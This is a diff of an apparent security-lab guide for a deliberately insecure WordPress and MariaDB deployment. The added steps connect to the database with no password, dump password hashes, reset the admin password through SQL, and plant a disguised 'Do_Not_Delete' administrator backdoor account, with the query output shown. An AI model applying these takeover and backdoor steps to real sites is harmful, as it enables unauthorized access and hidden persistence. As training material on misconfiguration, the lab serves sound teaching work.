@@ -7,17 +7,22 @@ We will demonstrate this vulnerability with some simple commands.  After using a
 # TASK1:
 __MISSION:__  Install the LAMP web-app, "WordPress" Via Ansible Role
 
-__STEPS:__	Run the job template "LAMP WordPress Deploy" from Ansible Tower, to install the web application for WordPress.  
+__STEPS:__  Run the job template "LAMP WordPress Deploy" from Ansible Tower, to install the web application for WordPress.  
 
-- This installs the Apache server on rhel1.example.com and the DB server on $server02.
-- This also installs the hacker tool scripts we're going to use.  They install to $workstation
-- To validate install, from your workstation, go to http://rhel1.example.com
+- This role is configured to run against three servers in a group called *lampservers* :
+| lampweb | lampdb | lampjump |
+| :----------------------: | :----------------------: | :----------------------: |
+| This server is used for the apache web server.  There is no local database on this machine | this server is a standalone database with no other purpose than to hose the MySQL / MariaDB. | This is a "jump box," representing a machine that a hacker might use to connect and run some scripts in order to exploit your new web site. |
+| The wordpress application is set with a default login of: `admin` with a password of `Password123`. | The database has been configured correctly to the WordPress application.  However, we made a major mistake here and left one account unsecured.  It's possibly (and sometimes default) to have a database configured to allow traffic from ANYWHERE with NO PASSWORD REQUIRED!!!!  | You will log in as lab-user to this machine and see a script in your home directory.  Additionally, you can run remote MySQL commands from this machine against the unsecured database. |
+ 
+- This role appears to install an innocent apache server on one and a db on the other.  To the innocent eye, we complete this step and validate by visiting the website... everything looks clean and safe!
+- Once ths role is run, you can confirm the application has been installed by using a web browser to go to http://rhel1.example.com
 
 
 # TASK2:	
-__MISSION:__  Confirm we can access the database insecurely
+__MISSION:__  Confirm we can access the database insecurely and mess with the user accouts that already exist on the box.  This effectively will lock out the legitimate user of the WordPress site so that they can no longer log in... but you will now have admin access to the site!
 
-__STEPS:__	Go to the command-line of your machine and connect to the database.  This command will allow you to connect and will prove that the DB has been set up insecurely so that anyone can connect with no password, from any machine, anywhere.
+__STEPS:__	Go to the command-line of your jumpbox machine.  SSH in as *lab-user@rhel3.example.com* and connect to the database.  This command will allow you to connect and will prove that the DB has been set up insecurely so that anyone can connect with no password, from any machine, anywhere.
 
 We have a user named "insecure" with no password for his account.  His access is set wide open.  Run this command to confirm you can connect.
 
@@ -39,10 +44,133 @@ If you see the above dialogue, you're in!  And that's really really bad.
 
 <img src="https://raw.githubusercontent.com/RedHatDemos/SecurityDemos/master/2019Labs/WebAppLAMPLab/roles/wordpress-server/templates/twentyseventeen-catsploit/assets/images/cat-hack01.jpg" width="150">
 
-Okay, so that's not good.  No really, that's not good at all.  Anyone with a bit of curiosity can directly access the database that runs your entire site!  They could add their own users and just sit back and wait... and when you run for public office, they could start posting bad things about you on YOUR OWN WEBSITE!  Or they could just go for the gusto right now and cover your site in cat memes.  Yeah.  That's the one.  In the next step, that's exactly what we're going to look at.
+Okay, so that's not good.  No really, that's not good at all.  Anyone with a bit of curiosity can directly access the database that runs your entire site!  They could add their own users and just sit back and wait... and when you run for public office, they could start posting bad things about you on YOUR OWN WEBSITE!  Or they could just go for the gusto right now and cover your site in cat memes.  Yeah.  That's the one.  In the next step, that's exactly what we're going to look at.  But first, let's make ourselves a WordPress user so we can go in anytime and post articles.
+
+- While we're in the MySQL database, let's take a look at the users who are allowed to log in to the WordPress server:
+
+```select user_login,user_pass from wp_users;```
+
+```select * from wp_usermeta WHERE meta_key = 'wp_capabilities';```
+
+We see the user and the password has that's stored in the database for this user, as well as data that defines the access level.  Now we're at a moral crossroads.  Do we notify the owner of the site to warn them of this vulnerability?  The fact that we can access the site's database and make changes without any credentials?  Ideally yes.  And I'm proud of you for that thought.  But in this case, we want to demonstrate how bad this could be.  So in this lab, we're going to do the wrong thing and take advantage of this inappropriate level of access.  The access level for this user (level 10, being an administrative user) is stored in a second table.  We can view this info direct from the databse and change it if we like:
+
+<pre>
+MariaDB [WordPress]> select user_login,user_pass,user_nicename from wp_users;
++------------+----------------------------------+---------------+
+| user_login | user_pass                        | user_nicename |
++------------+----------------------------------+---------------+
+| admin      | 42f749ade7f9e195bf475f37a44cafcb | admin         |
++------------+----------------------------------+---------------+
+1 row in set (0.00 sec)
+
+MariaDB [WordPress]> select * from wp_usermeta WHERE meta_key = 'wp_capabilities';
++----------+---------+-----------------+---------------------------------+
+| umeta_id | user_id | meta_key        | meta_value                      |
++----------+---------+-----------------+---------------------------------+
+|       11 |       1 | wp_capabilities | a:1:{s:13:"administrator";b:1;} |
++----------+---------+-----------------+---------------------------------+
+1 row in set (0.00 sec)
+
+
+MariaDB [WordPress]> 
+
+</pre>
+
+From here... we could change the admin password so that we can always log in as "admin" with our new password.  Chances are, someone will realize they're locked out and eventually get back in.  A real-world example would actually be sneaker:  if we were the type of user to do such a thing as this, we would probably create an ambiguous username that *looked* official but was our secret access backdoor.
+
+## The easy way
+- it's as simple as updating the admin user's password.  We don't know what that password even is, so we can't log in to WordPress conole... but we have wide open database access!  So we can set it to whatever we want!
+
+- run this command to change the wordpress admin user's password:
+
+```update wp_users set  user_pass=MD5('FluffyBunny') WHERE `user_login`='admin';```
+
+- The admin user for this WordPress instance is now set to:
+  * login: `admin`
+  * password:  `FluffyBunny`
+
+- Verify you have access by visiting this admin login URL and logging in with your new credentials.
+  * http://rhel1.example.com/wp-admin/
+
+## The slightly less easy but more sneaky way
+
+We have already gained access to WordPress by changing the admin password.  But we want to see how we would do this a bit more covertly.  So instead, let's create an inocuous account that we know the credentials to access.  In the database queries above, we see two tables worth of information that link together.  `wp_users` and `wp_usermeta`
+
+- While we're in the MySQL database, let's add a user that appears to belong there, but does not.  We will make this our personal login with the username: "wordpress_required".  The idea is that a novice admin will likely not delete a user account that's required.
+
+First, we insert a brand new login:
+
+```INSERT into wp_users SET user_login='wordpress_required',user_pass=MD5('FluffyBunny'),user_nicename='Do_Not_Delete_REQUIRED-ACCOUNT';```
+
+<pre>
+MariaDB [WordPress]> INSERT into wp_users SET user_login='wordpress_required',user_pass=MD5('FluffyBunny'),user_nicename='Do_Not_Delete_REQUIRED-ACCOUNT';
+Query OK, 1 row affected (0.00 sec)
+
+MariaDB [WordPress]> 
+</pre>
+
+Now, let's confirm this user was created:
+
+```select ID,user_login,user_pass,user_nicename from wp_users;```
+
+Here's what it looks like:
+
+<pre>
+MariaDB [WordPress]> select ID,user_login,user_pass,user_nicename from wp_users;
++----+--------------------+------------------------------------+--------------------------------+
+| ID | user_login         | user_pass                          | user_nicename                  |
++----+--------------------+------------------------------------+--------------------------------+
+|  1 | admin              | $P$Bha6OJvmFvFqF7U6VtpPtkDwf0FEgj1 | admin                          |
+|  2 | wordpress_required | 548e433bb693edbf70e56bee209cb09f   | Do_Not_Delete_REQUIRED-ACCOUNT |
++----+--------------------+------------------------------------+--------------------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [WordPress]> 
+</pre>
+
+Our new "wordpress_required" account has been created with our password "FluffyBunny".  The user_nicename is set to an ambiguous message that would make a novice administrator hesitant to delete that account.
+
+With that output, we see that the new user ID in the far left column is 2.  Now we also need to insert a record into the user access table called *wp_usermeta*.  We don't really need to know what this coded data means.  We're just going to duplicate the record for the "admin" user and set it for our account.  The default admin user has a key of: `a:1:{s:13:"administrator";b:1;}` in the wp_usermeta table for the value of `wp_capabilities`.
+
+Run this query to give our new user permissions to match the default administrator.
+
+```INSERT into wp_usermeta SET user_id='2',meta_key='wp_capabilities',meta_value='a:1:{s:13:"administrator";b:1;}';```
+
+<pre>
+MariaDB [WordPress]> INSERT into wp_usermeta SET user_id='2',meta_key='wp_capabilities',meta_value='a:1:{s:13:"administrator";b:1;}';
+Query OK, 1 row affected (0.00 sec)
+
+MariaDB [WordPress]> select * from wp_usermeta WHERE meta_key = 'wp_capabilities';
++----------+---------+-----------------+---------------------------------+
+| umeta_id | user_id | meta_key        | meta_value                      |
++----------+---------+-----------------+---------------------------------+
+|       11 |       1 | wp_capabilities | a:1:{s:13:"administrator";b:1;} |
+|       40 |       2 | wp_capabilities | a:1:{s:13:"administrator";b:1;} |
++----------+---------+-----------------+---------------------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [WordPress]> 
+</pre>
+
+WOW.  We are in!  Verify by logging in as our new account.  You may have to log out if you're already logged in as admin.
+
+- The new administrator user for this WordPress instance is now set to:
+  * login: `wordpress_required`
+  * password:  `FluffyBunny`
+
+- Verify you have access by visiting this admin login URL and logging in with your new credentials.
+  * http://rhel1.example.com/wp-admin/
 
 - For now, get out of the MySQL prompt...
 - Type "exit" to leave the MySQL prompt and return back to a regular command line.
+
+
+
+
+
+
+
+
 
 
 # TASK3:	
